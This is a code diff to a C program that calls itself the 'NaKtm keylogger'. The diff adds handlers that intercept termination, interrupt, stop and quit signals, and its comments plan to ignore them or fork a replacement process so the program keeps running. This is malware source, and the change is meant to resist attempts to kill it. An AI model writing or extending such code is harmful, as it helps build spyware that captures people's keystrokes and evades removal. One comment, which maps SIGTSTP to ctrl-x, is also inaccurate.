@@ -20,6 +20,7 @@
 #include <stdio.h>
 #include <unistd.h>
 //#include <sstream>
+#include <signal.h>
 
 #define KEYPRESSED 1
 #define KEYRELEASED 0
@@ -67,12 +68,43 @@ char keyMap(u_int16_t input){
     }
 }
 
+// bad practice (read: undefined behavior) to print from the signal handler.
+// it would be better to set a flag
+// for now, nice for debugging
+//
+// Proposed actions: Ignore signal and continue executing,
+// or respond by forking a new proc and killing the current one
+void sigHandler(int signal, siginfo_t *info, void* arg) {
+
+    printf("\nHandling signal: %s\n", strsignal(signal));
+
+}
+
+void setSigAction(){
+
+    // Configure the action taken upon receipt of a signal
+    struct sigaction sigAction = { 0 };
+    sigAction.sa_sigaction = &sigHandler; // specify which function to handle signal
+    sigAction.sa_flags = SA_SIGINFO; // provide info to the handler
+
+    // catch signals, take action specified in above struct
+    sigaction(SIGTERM,&sigAction,NULL); //
+    sigaction(SIGINT,&sigAction,NULL); // Interrupt, usually ctrl-c
+    sigaction(SIGTSTP,&sigAction,NULL); // Stop, usually ctrl-x
+    sigaction(SIGQUIT,&sigAction,NULL); // Quit, usually ctrl-\
+
+}
 
 int main() {
 
     // let's be verbose for now to debug our program.
     printf("NaKtm keylogger started.\n");
     fflush(stdout);
+
+
+    // set signal handlers
+    setSigAction();
+
 
     /* char* keyboard hardcoded for now. Future version would
      * scan devices and choose the correct device.
